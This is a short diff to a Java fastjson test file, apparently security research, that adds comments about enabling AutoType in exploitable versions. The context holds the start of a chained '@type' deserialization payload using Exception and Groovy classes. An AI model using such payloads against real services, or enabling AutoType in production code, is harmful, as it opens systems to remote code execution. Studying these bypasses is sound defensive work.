@@ -5,6 +5,9 @@ import com.alibaba.fastjson.JSONObject;
 
 public class FastJsonTest {
     public static void main(String[] args) {
+        // if enable, <1.2.76 can be exploited
+        // 全局启用 AutoType
+//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
         String json ="{\n" +
                 "  \"@type\":\"java.lang.Exception\",\n" +
                 "  \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
